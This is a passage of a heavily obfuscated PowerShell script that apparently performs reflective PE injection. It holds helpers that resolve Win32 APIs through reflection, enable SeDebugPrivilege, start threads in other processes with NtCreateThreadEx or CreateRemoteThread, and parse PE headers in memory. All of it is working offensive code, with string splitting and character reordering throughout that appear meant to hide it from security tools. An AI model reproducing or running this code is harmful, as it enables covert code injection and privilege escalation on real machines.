		${CRe`ATet`H`READ`Ad`Dr} = &("{2}{4}{1}{3}{0}" -f'ss','t-ProcAddr','G','e','e') ("{3}{2}{1}{0}"-f'l','l32.dl','erne','K') ("{0}{2}{1}" -f'Cre','Thread','ate')
        ${CR`e`A`Te`THreADdEL`egAte} = &("{1}{2}{3}{0}" -f'Type','G','e','t-Delegate') @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32],   $m28r76.("{3}{4}{2}{0}{1}" -f 'R','efType','y','Ma','keB').Invoke()) ([IntPtr])
        ${cR`EatETH`ReaD} =  $15Y4hS::("{3}{4}{1}{7}{0}{5}{2}{8}{6}" -f'ForFunct','g','o','Ge','tDele','ionP','r','ate','inte').Invoke(${C`REAtEt`hReAdaD`Dr}, ${CReaTeT`hReAD`Deleg`Ate})
		${win`32fU`NCTio`Ns} | &("{1}{3}{2}{0}" -f'mber','A','-Me','dd') -MemberType ("{3}{0}{2}{1}"-f'tePrope','ty','r','No') -Name ("{1}{2}{0}"-f 'ead','Creat','eThr') -Value ${C`REatEt`H`REad}
		
		return ${w`I`N`32FUnctIONS}
	}
	

			
	
	
	

	
	
	Function s`UB-`SIGned`InTA`sUNsiG`NED
	{
		Param(
		[Parameter(pOsItiON = 0, MAnDATOrY = ${t`RuE})]
		[Int64]
		${VA`L`UE1},
		
		[Parameter(POSition = 1, MAndaToRY = ${t`RUe})]
		[Int64]
		${Va`LUe2}
		)
		
		[Byte[]]${V`AlUE1`By`TES} =  (  &("{1}{0}{2}"-f'bL','VaRiA','e')  C7JF6H  )."vAL`Ue"::("{2}{1}{0}"-f 'tes','By','Get').Invoke(${VA`l`Ue1})
		[Byte[]]${V`AlUE`2`ByTes} =   (&("{0}{2}{1}" -f 'C','ildItEm','H')  varIABle:c7JF6h  )."v`ALuE"::("{0}{2}{1}" -f 'GetB','tes','y').Invoke(${Va`lue2})
		[Byte[]]${fi`N`AlbyTEs} =  $c7JF6H::"g`E`TBytEs"([UInt64]0)

		if (${vaL`UE1bY`Tes}."cou`NT" -eq ${VaL`U`E2ByT`es}."coU`Nt")
		{
			${CARr`y`ovER} = 0
			for (${i} = 0; ${i} -lt ${va`LUE1b`yTeS}."COU`NT"; ${i}++)
			{
				${V`Al} = ${VALU`E1b`YTES}[${i}] - ${C`ARR`yOver}
				
				if (${v`Al} -lt ${V`ALuE2`BytES}[${i}])
				{
					${v`Al} += 256
					${ca`RRy`oVeR} = 1
				}
				else
				{
					${caRryO`V`er} = 0
				}
				
				
				[UInt16]${s`Um} = ${v`Al} - ${VAL`Ue2B`YteS}[${I}]

				${Fi`NaL`B`YteS}[${I}] = ${s`UM} -band 0x00FF
			}
		}
		else
		{
			Throw ("{1}{2}{5}{4}{0}{6}{7}{3}"-f'ys of diff','Cann','ot ','t sizes','arra','subtract byte','e','ren')
		}
		
		return  ( &('GI') ('v'+'a'+'riABLe:C'+'7j'+'f6h') )."val`Ue"::("{1}{0}" -f 'Int64','To').Invoke(${f`i`NAlBYt`es}, 0)
	}
	

	Function a`D`d`-sIG`Ne`DinTasUnSIgnED
	{
		Param(
		[Parameter(POsitiON = 0, MANDaTorY = ${T`RUe})]
		[Int64]
		${Va`L`Ue1},
		
		[Parameter(PoSITiON = 1, maNDatoRY = ${TR`Ue})]
		[Int64]
		${va`l`Ue2}
		)
		
		[Byte[]]${VALu`E1`ByT`ES} =   $C7jf6H::("{0}{2}{1}"-f'G','es','etByt').Invoke(${v`AlUe1})
		[Byte[]]${Val`UE2b`Yt`Es} =  (  &("{0}{1}"-f 'Di','r') ('VA'+'RiaBlE:'+'C7j'+'F6'+'h') )."V`ALUe"::("{1}{0}{2}" -f 'etByte','G','s').Invoke(${v`A`LuE2})
		[Byte[]]${f`INaLBYT`Es} =  (&("{0}{1}" -f'ITe','M')  ('vA'+'rIAB'+'LE:c7JF6'+'h'))."VA`LUe"::"GEtbYt`eS"([UInt64]0)

		if (${VALUe1`B`YTes}."Co`UNT" -eq ${va`lu`E2BYteS}."cou`Nt")
		{
			${C`ARr`Y`oVEr} = 0
			for (${I} = 0; ${I} -lt ${Val`U`e1`ByTEs}."co`Unt"; ${i}++)
			{
				
				[UInt16]${s`Um} = ${Va`lu`E1`ByTES}[${i}] + ${vaL`U`E2By`TeS}[${I}] + ${c`A`RryOv`er}

				${fi`NALBy`T`ES}[${i}] = ${s`UM} -band 0x00FF
				
				if ((${S`Um} -band 0xFF00) -eq 0x100)
				{
					${C`ArRyo`V`eR} = 1
				}
				else
				{
					${c`ArR`yo`VeR} = 0
				}
			}
		}
		else
		{
			Throw ("{10}{4}{5}{7}{0}{2}{6}{8}{11}{1}{3}{9}"-f'b','t siz','ytearray','e','ot',' a','s of diff','dd ','ere','s','Cann','n')
		}
		
		return  ( &("{2}{1}{0}" -f 'AbLe','RI','GeT-Va')  ('C7Jf'+'6H')  )."vaL`UE"::("{0}{1}" -f'ToI','nt64').Invoke(${F`i`NAlByTEs}, 0)
	}
	

	Function c`O`mPAre-v`Al1GRE`AteR`Th`ANvAL2`ASuiNt
	{
		Param(
		[Parameter(pOsiTioN = 0, MAndAToRy = ${t`RUE})]
		[Int64]
		${VALU`e1},
		
		[Parameter(poSitION = 1, mANDAToRY = ${TR`Ue})]
		[Int64]
		${vaL`U`e2}
		)
		
		[Byte[]]${ValU`e1B`y`TES} =   (&("{0}{2}{1}"-f'gEt','EM','-it')  VARiaBle:C7JF6H)."VAL`Ue"::("{1}{0}" -f'Bytes','Get').Invoke(${VA`l`UE1})
		[Byte[]]${Val`Ue2B`y`TES} =   ( &('Gi')  ('VaRi'+'A'+'blE:c7Jf'+'6h'))."vaL`UE"::("{0}{1}{2}" -f'Ge','t','Bytes').Invoke(${VaLu`e2})

		if (${vAlue1`Byt`Es}."c`ounT" -eq ${vaLUe2`BYT`ES}."C`OuNt")
		{
			for (${I} = ${v`A`LUe1b`yteS}."COU`NT"-1; ${i} -ge 0; ${I}--)
			{
				if (${VA`L`Ue1byTEs}[${I}] -gt ${vAl`UE2`BY`TES}[${i}])
				{
					return ${T`RUe}
				}
				elseif (${v`Al`Ue1B`YtEs}[${I}] -lt ${v`AL`UE2BYTes}[${i}])
				{
					return ${F`A`LSE}
				}
			}
		}
		else
		{
			Throw ("{3}{7}{1}{6}{4}{0}{5}{2}" -f' si','te arrays of','e','Cannot compar','t','z',' differen','e by')
		}
		
		return ${Fa`l`SE}
	}
	

	Function co`NverT`-UIn`Tto`INt
	{
		Param(
		[Parameter(PosITion = 0, ManDatORY = ${TR`Ue})]
		[UInt64]
		${v`A`Lue}
		)
		
		[Byte[]]${vaLUE`B`YT`Es} =   $C7jf6h::("{1}{0}{2}" -f'etByte','G','s').Invoke(${V`ALue})
		return (  $c7JF6H::("{1}{0}" -f 'Int64','To').Invoke(${VALU`eBy`TeS}, 0))
	}
	
	
	Function TE`sT-mEm`O`RyrAN`g`EV`ALid
	{
		Param(
		[Parameter(PositIOn = 0, MaNdAToRY = ${T`RUE})]
		[String]
		${deBugsT`RI`NG},
		
		[Parameter(POSItioN = 1, MAndATORy = ${t`RuE})]
		[System.Object]
		${p`E`Info},
		
		[Parameter(poSitIoN = 2, mandAtORY = ${T`RuE})]
		[IntPtr]
		${S`TarT`Add`ReSS},
		
		[Parameter(PArAmetERSetnAmE = "eN`d`ADDR`ESS", PoSItion = 3, MaNdaTorY = ${Tr`Ue})]
		[IntPtr]
		${E`NdA`dD`ReSS},
		
		[Parameter(paRamEtErSeTNaMe = "sI`Ze", poSitIon = 3, mANDatOry = ${T`Rue})]
		[IntPtr]
		${si`Ze}
		)
		
		[IntPtr]${fi`NALen`dA`DdResS} =  ( &("{0}{2}{3}{1}{4}" -f'gE','DiTE','t-CH','il','M')  VariaBlE:1i2l  )."V`ALue"::"ZE`Ro"
		if (${psC`mD`LEt}.paRAMetErSeTNAMe -eq ("{1}{0}" -f 'ze','Si'))
		{
			[IntPtr]${FiN`A`LENDa`DDr`eSS} = [IntPtr](&("{4}{6}{0}{1}{2}{5}{3}"-f'ignedI','nt','AsUns','gned','Ad','i','d-S') (${S`TARt`AD`D`ResS}) (${S`IzE}))
		}
		else
		{
			${fIN`ALEn`D`A`ddresS} = ${ENDa`d`d`ReSs}
		}
		
		${P`eE`NdaDDREss} = ${p`einFo}."END`A`ddR`eSs"
		
		if ((&("{3}{4}{6}{5}{2}{1}{0}"-f'AsUInt','al2','hanV','Compar','e-V','terT','al1Grea') (${pei`NfO}."pe`haNdlE") (${S`TARtAd`d`R`eSS})) -eq ${t`RUe})
		{
			Throw ('T'+'rying'+' '+'to'+' '+'w'+'r'+'ite '+'t'+'o '+'m'+'emo'+'ry '+'sma'+'ller'+' '+'tha'+'n '+'alloc'+'ate'+'d '+'add'+'res'+'s '+'r'+'ange.'+' '+"$DebugString")
		}
		if ((&("{5}{0}{3}{2}{1}{4}" -f 'l1GreaterT','sUIn','A','hanVal2','t','Compare-Va') (${fI`N`ALeNdaDDre`Ss}) (${PEenDA`Dd`Ress})) -eq ${T`Rue})
		{
			Throw ('Tr'+'ying '+'to'+' '+'w'+'rite '+'to'+' '+'memo'+'ry '+'great'+'e'+'r '+'tha'+'n '+'a'+'llocate'+'d '+'add'+'ress '+'rang'+'e. '+"$DebugString")
		}
	}
	
	
	Function WRIte-`BytES`TOMe`MorY
	{
		Param(
			[Parameter(POsITIoN=0, MANdatoRy = ${TR`UE})]
			[Byte[]]
			${by`Tes},
			
			[Parameter(poSitiON=1, MANDATORY = ${TR`Ue})]
			[IntPtr]
			${memorY`AD`DreSS}
		)
	
		for (${OF`FseT} = 0; ${o`F`FSEt} -lt ${by`T`es}."l`enGth"; ${O`Ffset}++)
		{
			 $15y4hs::"W`RiTEb`y`Te"(${Me`M`orY`A`DdrESS}, ${o`Ff`SeT}, ${by`TES}[${OfF`seT}])
		}
	}
	

	
	Function geT-dElEGA`T`ET`ypE
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( PoSiTIOn = 0)]
	        [Type[]]
	        ${pAraMe`T`ErS} = (&("{2}{1}{0}" -f 'ect','ew-Obj','N') ("{0}{1}{2}" -f'T','yp','e[]')(0)),
	        
	        [Parameter( POSITiOn = 1 )]
	        [Type]
	        ${rETu`Rn`TYPe} = [Void]
	    )

	    ${d`Oma`In} =   (&("{0}{2}{1}" -f 'gET-','bLE','vaRia') ("a"+"570W") -VAlUeONLY  )::"CUrRENt`DOmA`in"
	    ${DYn`AssEMB`LY} = &("{2}{1}{3}{0}" -f'bject','-','New','O') ("{4}{0}{1}{6}{7}{2}{3}{5}" -f'e','fl','tion','.AssemblyN','System.R','ame','e','c')(("{5}{3}{2}{4}{1}{0}"-f 'te','ga','edDe','flect','le','Re'))
	    ${aSSe`m`BL`YbuIL`dEr} = ${DOMA`in}.("{3}{5}{2}{4}{0}{1}" -f'micAsse','mbly','yn','De','a','fineD').Invoke(${D`Yna`sSEM`BLy},   $QY04F7::"R`Un")
	    ${m`o`dulEbuild`er} = ${ASSe`mB`L`Y`BuILDEr}.("{0}{2}{4}{1}{3}" -f'Defin','du','eD','le','ynamicMo').Invoke(("{0}{3}{1}{2}"-f'InMemor','dul','e','yMo'), ${FaL`SE})
	    ${t`y`PE`BuILder} = ${moDUL`Ebu`il`D`eR}.("{1}{0}{2}" -f 'e','Defin','Type').Invoke(("{1}{4}{2}{0}{3}"-f 'T','MyDel','e','ype','egat'), ("{3}{10}{9}{11}{5}{7}{6}{4}{0}{1}{8}{2}"-f'ns','iClass,','lass','Clas','A','c','d, ',', Seale',' AutoC','u','s, P','bli'), [System.MulticastDelegate])
	    ${ConS`TRu`cT`O`RB`U`ILDEr} = ${t`Y`PEBUILd`ER}.("{1}{0}{2}{3}{4}" -f 'ef','D','i','neConstruc','tor').Invoke(("{1}{2}{5}{3}{4}{0}" -f 'lic','RT','Special','BySig,',' Pub','Name, Hide'),   (&("{1}{0}{3}{2}" -f't-','GE','hildItEM','c') ("var"+"Ia"+"Ble:"+"r"+"z1K4"))."val`UE"::"STaN`daRd", ${p`Ar`AmetE`RS})
	    ${c`o`NSTrUcTorBU`ILDer}.("{1}{5}{4}{3}{6}{2}{0}"-f'onFlags','SetI','ti','n','pleme','m','ta').Invoke(("{0}{3}{2}{1}" -f 'Runt','aged','n','ime, Ma'))
	    ${mE`ThOD`B`UilD`Er} = ${T`YpEBu`i`LDeR}.("{2}{3}{1}{0}" -f 'd','eMetho','De','fin').Invoke('Invoke', ("{4}{1}{0}{6}{5}{2}{3}" -f 'Sig,','blic, HideBy','ewSlot, Vi','rtual','Pu','N',' '), ${re`TU`R`NTyPe}, ${Par`AM`E`TeRs})
	    ${MET`HO`DBUild`er}.("{3}{4}{2}{5}{0}{1}" -f'ntationF','lags','l','S','etImp','eme').Invoke(("{3}{1}{0}{2}" -f 'Manage',' ','d','Runtime,'))
	    
	    &("{0}{3}{2}{1}"-f 'W','-Output','te','ri') ${ty`PeBU`I`lDeR}.("{0}{1}{2}"-f 'Cr','eateT','ype').Invoke()
	}


	
	Function G`Et`-pRoC`A`DdrESs
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( poSITIOn = 0, mANdAtorY = ${T`RUe} )]
	        [String]
	        ${ModU`le},
	        
	        [Parameter( PoSiTioN = 1, mANDaTOry = ${Tr`Ue} )]
	        [String]
	        ${p`RocED`URE}
	    )

	    
	    ${SYS`Te`maS`SEMB`LY} =  (&("{1}{0}"-f'E','vaRiAbl') A570w -vA)::"CurRE`NT`DomA`iN".("{2}{1}{0}{3}" -f 's','etA','G','semblies').Invoke() |
	        &("{2}{3}{1}{0}" -f 'ct','e','W','here-Obj') { ${_}."GlOBa`LA`s`s`EMBlYCACHe" -And ${_}."LO`cati`On".("{0}{1}" -f'Spli','t').Invoke('\\')[-1].("{0}{1}" -f 'Equa','ls').Invoke(("{1}{0}{2}"-f'm.dl','Syste','l')) }
	    ${uNSaFenAtiVE`M`E`T`H`ODS} = ${syst`E`M`Ass`EmBly}.("{0}{1}"-f 'G','etType').Invoke(("{1}{2}{4}{6}{3}{5}{0}{7}" -f'ativeMe','Microso','ft.','.U','Win','nsafeN','32','thods'))
	    
	    ${G`EtM`ODuleh`AN`Dle} = ${uNsaF`ena`TI`VeMEtHODs}.("{2}{0}{1}{3}"-f 'Me','t','Get','hod').Invoke(("{1}{2}{0}"-f 'e','Ge','tModuleHandl'))
	    ${GEtprOCAd`DRE`Ss} = ${u`NS`AFEnatiV`emeth`O`dS}.("{1}{0}{2}"-f 'ho','GetMet','d').Invoke(("{2}{0}{1}" -f'rocAd','dress','GetP'))
	    
	    ${kE`RN32`h`A`NdLE} = ${geT`mo`DULE`hanDLE}."iN`Voke"(${N`ULL}, @(${M`ODu`lE}))
	    ${T`m`pPTR} = &("{0}{3}{1}{2}"-f'Ne','ec','t','w-Obj') ("{0}{2}{1}" -f 'I','tr','ntP')
	    ${HaNdl`ER`eF} = &("{1}{0}{2}"-f 'w-O','Ne','bject') ("{6}{5}{3}{0}{2}{1}{4}"-f'ntero','r','pSe','.I','vices.HandleRef','ime','System.Runt')(${t`MpPTr}, ${Ke`RN32haND`Le})

	    
	    &("{1}{2}{0}" -f 'Output','W','rite-') ${GETpro`Ca`D`dresS}."inVo`ke"(${n`ULL}, @([System.Runtime.InteropServices.HandleRef]${HAN`dLER`Ef}, ${Pr`ocED`URE}))
	}
	
	
	Function EnA`B`Le-sedebuG`pR`Iv`i`LEgE
	{
		Param(
		[Parameter(pOSiTIoN = 1, MANDatORY = ${TR`UE})]
		[System.Object]
		${win32F`UnC`TIO`NS},
		
		[Parameter(POsiTION = 2, ManDAtorY = ${TR`Ue})]
		[System.Object]
		${W`In3`2tY`PES},
		
		[Parameter(pOSITiOn = 3, maNDaTory = ${T`RUE})]
		[System.Object]
		${w`in3`2cO`NstAN`Ts}
		)
		
		[IntPtr]${tH`R`Eadh`AnDLe} = ${w`in3`2`FUnCTI`Ons}."gE`TCUR`RENtTHr`EAd"."IN`VokE"()
		if (${tHrE`ADH`AndLE} -eq  $1I2l::"z`eRo")
		{
			Throw ("{12}{5}{10}{6}{2}{11}{8}{1}{9}{0}{3}{7}{4}" -f'the c','e','e ','ur','nt thread','o g','t th','re','dl',' to ','e','han','Unable t')
		}
		
		[IntPtr]${T`hr`ead`TOKeN} =  (&("{1}{0}"-f'r','di')  ("va"+"riablE"+":1"+"i2l")  )."VA`LUe"::"zE`Ro"
		[Bool]${rE`S`Ult} = ${WI`N3`2funct`IOns}."o`PEnth`ReadtOkeN"."in`V`oke"(${threaDhAn`d`le}, ${win`32C`OnS`TanTS}."T`oKe`N_`qUerY" -bor ${WiN32`Con`staN`Ts}."tok`E`N_adj`Us`T_PRiVileges", ${F`ALSE}, [Ref]${T`HrEAD`ToKeN})
		if (${rEs`ULT} -eq ${f`ALse})
		{
			${e`RRorCO`de} =  ( &('Gi') ("VAriAb"+"Le:15"+"y"+"4Hs") )."V`AlUe"::("{3}{1}{2}{0}"-f 'or','tLastWin32','Err','Ge').Invoke()
			if (${e`R`RoRCo`De} -eq ${W`In32coNS`TAN`Ts}."ErROR`_NO_to`KEN")
			{
				${rE`sULT} = ${w`In`32`Fun`CtiONs}."IMpErSoN`A`Tes`ELf"."I`Nv`oKE"(3)
				if (${R`esulT} -eq ${FAL`Se})
				{
					Throw ("{6}{0}{5}{4}{1}{3}{2}"-f'able ','onate ','elf','s','s','to imper','Un')
				}
				
				${r`EsU`Lt} = ${wiN32fUncT`iO`NS}."O`P`enTHrEadt`Ok`en"."i`NVOKe"(${tH`READ`Han`D`LE}, ${WIn3`2`c`ONst`AnTs}."tOk`eN_qU`E`RY" -bor ${W`iN3`2Con`s`TanTs}."t`o`kEn_aD`j`U`St_`pRIVILEGeS", ${faL`sE}, [Ref]${tHREAD`TOk`EN})
				if (${r`eSult} -eq ${faL`sE})
				{
					Throw ("{5}{0}{4}{3}{1}{2}{6}" -f 'to','nT','hread','pe',' O','Unable ','Token.')
				}
			}
			else
			{
				Throw ('Unabl'+'e '+'t'+'o '+'O'+'p'+'enThr'+'eadToken. '+'Err'+'or '+'co'+'d'+'e: '+"$ErrorCode")
			}
		}
		
		[IntPtr]${pl`U`id} =   (&("{3}{2}{0}{1}" -f 't-va','Riable','e','G')  15y4hS  )."V`AlUe"::"allO`cHglo`B`AL"( $15y4hS::"S`IZEof"([Type]${w`In`32tYPES}."L`UiD"))
		${RES`U`LT} = ${w`in`32fUncT`IONS}."L`ooK`UppRi`VileGEVAl`UE"."iN`VOKE"(${NU`Ll}, ("{2}{4}{3}{1}{0}"-f 'rivilege','ugP','Se','eb','D'), ${P`lUId})
		if (${rEs`U`Lt} -eq ${FA`Lse})
		{
			Throw ("{0}{9}{5}{7}{1}{2}{8}{4}{6}{3}" -f'U','ll Loo','kup','e','rivilegeVal','ble to c','u','a','P','na')
		}

		[UInt32]${t`OKEnPrIVS`I`Ze} =  ( &("{0}{1}{2}" -f 'C','HildIte','m') vArIAblE:15Y4hS )."val`Ue"::"S`izEOF"([Type]${WI`N32tYp`Es}."tOk`e`N_P`Ri`VilEGeS")
		[IntPtr]${tOkENpri`Vi`LE`gESMEm} =  (  &("{0}{1}{2}" -f 'C','hiLd','ITEM')  vARIAbLe:15y4Hs)."VAl`UE"::("{2}{0}{1}" -f'locHG','lobal','Al').Invoke(${tOkenPr`i`Vs`izE})
		${ToKeN`PR`IV`iL`EGes} =  (&("{0}{1}"-f'ge','T-ITEm') VarIaBLE:15y4HS )."VaL`Ue"::"ptrto`S`TrUc`T`URE"(${tOK`E`NP`R`IVilEgeSMeM}, [Type]${W`i`N32TYPEs}."tOkeN`_`p`Ri`VIleG`Es")
		${tOKe`NpRIV`iL`e`GES}."p`RIVILe`gE`COUNt" = 1
		${T`okenpriV`I`l`eGes}."PR`I`VIlEgEs"."Lu`iD" =   $15y4hs::"ptRTos`Tru`ct`Ure"(${P`L`UiD}, [Type]${w`I`N32`TypEs}."l`UId")
		${toKeNPriv`iL`EgEs}."PriVi`l`EGeS"."ATTRI`BUt`ES" = ${WIn3`2c`OnSt`Ants}."S`E`_PRI`V`IlE`gE_enABlED"
		 (&("{0}{2}{1}"-f 'Ch','iTem','ilD') ("vaRia"+"B"+"le:"+"1"+"5Y4hs") )."vAL`Ue"::("{2}{3}{0}{1}"-f 'ToPt','r','S','tructure').Invoke(${T`OkENp`RIv`i`LEges}, ${TO`KENP`RiVi`LeGE`SMEM}, ${t`RuE})

		${REs`ULT} = ${Wi`N`3`2F`UncTIons}."aDJUsTt`oK`EnPr`IvIl`E`gES"."Inv`OKe"(${TH`REa`dTOk`eN}, ${FA`LsE}, ${T`OK`EnprIv`IlE`GEsmem}, ${TOK`en`prI`VSIzE},  (&("{1}{0}" -f 'Le','vaRIAB') ("1I2"+"l") )."VAL`Ue"::"ze`RO",   $1I2L::"z`ERo")
		${e`RRo`Rco`DE} =  $15y4hS::("{1}{2}{0}{4}{3}"-f 'stWi','GetL','a','r','n32Erro').Invoke() 
		if ((${reS`ULT} -eq ${f`Al`se}) -or (${eR`Ro`RCodE} -ne 0))
		{
			
		}
		
		  ( &("{1}{0}{2}" -f 'IabL','GeT-Var','e') ("15y4H"+"s")  )."v`ALue"::("{2}{0}{1}"-f 'G','lobal','FreeH').Invoke(${T`oKEnp`RivIlE`GESMeM})
	}
	
	
	Function inv`okE-c`Re`ATeREm`OT`ET`hReAd
	{
		Param(
		[Parameter(POSitIOn = 1, MaNdAToRy = ${T`Rue})]
		[IntPtr]
		${PrOC`essh`ANDLe},
		
		[Parameter(pOsition = 2, maNDatory = ${tr`Ue})]
		[IntPtr]
		${StAR`T`ADdreSs},
		
		[Parameter(POsITioN = 3, manDAToRy = ${f`ALse})]
		[IntPtr]
		${ar`gumEntP`TR} =  (  &("{0}{1}" -f'g','CI') VArIabLe:1i2L )."VaL`Ue"::"z`ERo",
		
		[Parameter(POsiTIOn = 4, mANdAToRY = ${T`RUE})]
		[System.Object]
		${w`In32fu`N`ctiO`Ns}
		)
		
		[IntPtr]${remOteThREaDH`An`D`Le} =   (  &("{1}{0}{2}" -f 't-ITE','gE','M')  VARiABLE:1I2L  )."V`Alue"::"z`ErO"
		
		${OsVe`R`sI`ON} =  (&("{0}{1}"-f 'di','R')  ('VAr'+'IaBLe:ux'+'b'))."VAl`Ue"::"osVERSI`On"."VErSI`On"
		
		if ((${oSV`er`sion} -ge (&("{1}{3}{2}{0}"-f 't','N','-Objec','ew') ("{1}{2}{0}" -f'n','Versi','o') 6,0)) -and (${OSV`ers`iOn} -lt (&("{0}{2}{1}{3}"-f'N','c','ew-Obje','t') ("{0}{1}{2}"-f 'V','ersio','n') 6,2)))
		{
			&("{1}{0}{2}" -f 'er','Write-V','bose') ('W'+'i'+'ndows '+'V'+'ista/'+'7 '+'det'+'ec'+'ted'+', '+'usin'+'g '+'N'+'tCre'+'a'+'teThreadEx. '+'Ad'+'dress '+'o'+'f '+'thread'+':'+' '+"$StartAddress")
			${r`ETV`Al}= ${WIN32F`UNC`TioNs}."Nt`c`REaTEThR`eADEx"."InV`oKe"([Ref]${rE`MO`Te`T`h`REaDhAndlE}, 0x1FFFFF,  (  &("{2}{1}{0}"-f'eM','It','GEt-ChiLD')  vARiAbLE:1I2L )."V`ALue"::"Z`ERo", ${PR`oceS`s`HaND`LE}, ${stArtAd`d`RE`ss}, ${ARgUMe`N`T`pTR}, ${fa`LSe}, 0, 0xffff, 0xffff,   (  &('Gi')  ("vA"+"r"+"ia"+"bLE:1I2L") )."vA`lue"::"z`ero")
			${l`AsTeRR`OR} =   (&('gi') VAriABLe:15y4hs  )."VAl`Ue"::("{3}{2}{0}{1}"-f'astWin','32Error','tL','Ge').Invoke()
			if (${RE`MoT`E`THreA`dhAN`dLe} -eq   ( &("{0}{1}" -f'G','cI')  varIabLE:1I2l )."Val`Ue"::"zE`Ro")
			{
				Throw ('E'+'rr'+'or '+'i'+'n '+'N'+'tCre'+'ateTh'+'rea'+'dEx'+'. '+'R'+'etur'+'n '+'value:'+' '+"$RetVal. "+'Last'+'Er'+'ror: '+"$LastError")
			}
		}
		
		else
		{
			&("{2}{1}{0}"-f 'bose','r','Write-Ve') ('Wind'+'o'+'ws '+'XP/'+'8 '+'d'+'etected'+', '+'us'+'ing '+'Cre'+'a'+'teRe'+'mo'+'teThrea'+'d'+'. '+'A'+'d'+'dress '+'of'+' '+'thre'+'a'+'d: '+"$StartAddress")
			${ReM`OTET`hreAD`Ha`NDLE} = ${wIN`32fUncTIo`Ns}."crEateR`E`mO`TetH`R`EaD"."iNV`oke"(${p`R`OCeSsH`ANDlE},   (  &("{0}{1}"-f 'va','rIABLE') 1I2L -VaLueonLY )::"ze`RO", [UIntPtr][UInt64]0xFFFF, ${Sta`Rt`ADdr`eSS}, ${aRg`UMeN`T`PTr}, 0,  (&("{0}{1}{2}"-f'GET-vAr','iab','lE') ("1I"+"2L") -vaLu )::"Z`eRO")
		}
		
		if (${rEMotEth`REA`d`hAn`DlE} -eq   (  &("{2}{3}{1}{0}"-f'ablE','aRi','geT-','V') 1i2l )."Val`Ue"::"z`Ero")
		{
			&("{0}{2}{1}" -f'W','te-Verbose','ri') ("{6}{7}{9}{0}{8}{5}{2}{11}{1}{4}{3}{10}"-f'ting','n','e thread, thread','nul','dle is ','ot','Er','ror cre',' rem','a','l',' ha')
		}
		
		return ${R`eMoTE`ThrEaDha`Nd`Le}
	}

	

	Function gEt`-`ImAgEN`TheAD`e`RS
	{
		Param(
		[Parameter(POsITIon = 0, mANDatOrY = ${tr`Ue})]
		[IntPtr]
		${P`E`HANDlE},
		
		[Parameter(POsITion = 1, maNDatory = ${tR`UE})]
		[System.Object]
		${W`in`32TYPeS}
		)
		
		${n`THEAde`RSInFo} = &("{2}{0}{1}" -f'ew-Objec','t','N') ("{2}{0}{1}" -f 'ystem.Objec','t','S')
		
		
		${do`sHEAd`Er} =  (&("{2}{1}{0}{3}"-f'B','a','GET-VARi','Le')  ("15y4"+"Hs")  -VALUEoN )::"P`Tr`TOStRuC`Tu`Re"(${P`Eh`ANDLE}, [Type]${WiN32`Ty`pEs}."ImAge`_`dO`s_heA`DER")

		
		[IntPtr]${Nth`ea`Ders`P`Tr} = [IntPtr](&("{0}{3}{1}{2}{4}"-f 'Add-S','s','U','ignedIntA','nsigned') ([Int64]${peha`NDLe}) ([Int64][UInt64]${D`o`She`Ader}."e_`lfanEW"))
		${nT`H`EA`DerSI`NFo} | &("{0}{1}{2}"-f 'Add','-','Member') -MemberType ("{2}{1}{0}" -f'rty','ePrope','Not') -Name ("{0}{2}{1}"-f'NtH','rsPtr','eade') -Value ${N`TH`eA`DeRsPtR}
		${I`mageN`T`HEADEr`s64} =   $15y4hs::"PTrt`Ostr`U`CTURE"(${nTHE`Ad`e`Rs`PTR}, [Type]${WIN3`2T`yP`Es}."ima`GE`_NT`_hEaDE`Rs64")
		
		
	    if (${Im`A`gE`NtHeAdE`RS64}."SIgna`TuRe" -ne 0x00004550)
	    {
	        throw ("{0}{2}{5}{4}{1}{3}" -f 'Inva','_HEADER','lid IMA',' signature.','E_NT','G')
	    }
		
		if (${imAgEntHE`ADe`Rs`64}."opTIoNAlhe`A`Der"."mAg`IC" -eq ("{0}{5}{1}{4}{2}{3}"-f'IMAGE_NT_OPTIONA','64','AG','IC','_M','L_HDR'))
		{
			${n`TH`EaD`e`RsINfo} | &("{0}{1}{2}" -f'A','d','d-Member') -MemberType ("{1}{2}{0}"-f 'rty','NoteP','rope') -Name ("{2}{0}{3}{1}" -f 'T_','S','IMAGE_N','HEADER') -Value ${imA`geN`TH`eaD`ERS64}
			${n`T`HEa`DersiN`FO} | &("{0}{1}{3}{2}" -f'A','dd-','mber','Me') -MemberType ("{1}{2}{3}{0}" -f'rty','No','tePr','ope') -Name ("{1}{0}{2}" -f'4B','PE6','it') -Value ${tR`UE}
		}
		else
		{
			${I`Mag`enThea`Ders32} =   $15y4hs::"pt`R`T`oSTRU`cTUrE"(${nT`He`AdeRS`pTr}, [Type]${wiN32`TY`pEs}."IM`AGE_N`T_HE`ADeRs32")
			${N`THe`AD`eRs`InFo} | &("{2}{0}{1}"-f'mbe','r','Add-Me') -MemberType ("{0}{1}{3}{2}" -f'No','t','operty','ePr') -Name ("{1}{0}{2}"-f 'GE_NT_HEADER','IMA','S') -Value ${i`MaGeNthe`Ad`eRS`32}
			${N`T`hEAD`ersINFO} | &("{1}{2}{0}" -f 'er','Add','-Memb') -MemberType ("{2}{1}{0}"-f'erty','p','NotePro') -Name ("{0}{1}"-f'PE6','4Bit') -Value ${f`Al`Se}
		}
		
		return ${Nt`HeAde`RS`I`NfO}
	}


	
	Function gEt-`pE`B`AsICIN`Fo
	{
		Param(
		[Parameter( posiTION = 0, maNdAtORy = ${t`RUe} )]
		[Byte[]]
		${pEB`yt`eS},
		
		[Parameter(POSitION = 1, mANdAtoRY = ${tr`Ue})]
		[System.Object]
		${w`IN32T`YP`eS}
		)
		
		${Pe`i`NfO} = &("{1}{2}{0}"-f 'Object','Ne','w-') ("{0}{2}{1}" -f'S','tem.Object','ys')
		
		
		[IntPtr]${unma`NAgEd`peby`TeS} =   (&("{1}{0}"-f 'i','gC')  variABLE:15y4hs  )."Va`LUe"::("{2}{0}{1}"-f'loc','HGlobal','Al').Invoke(${PEby`TeS}."l`ENGTh")
		 (&("{1}{0}{2}" -f'ITe','chiLD','m')  vARiaBlE:15Y4hs)."V`AluE"::("{0}{1}"-f'Co','py').Invoke(${P`EBy`Tes}, 0, ${uNmaNaGe`DP`e`BYTEs}, ${Pe`By`TES}."L`eNGth") | &("{0}{1}{2}"-f 'Out-N','ul','l')
		
		
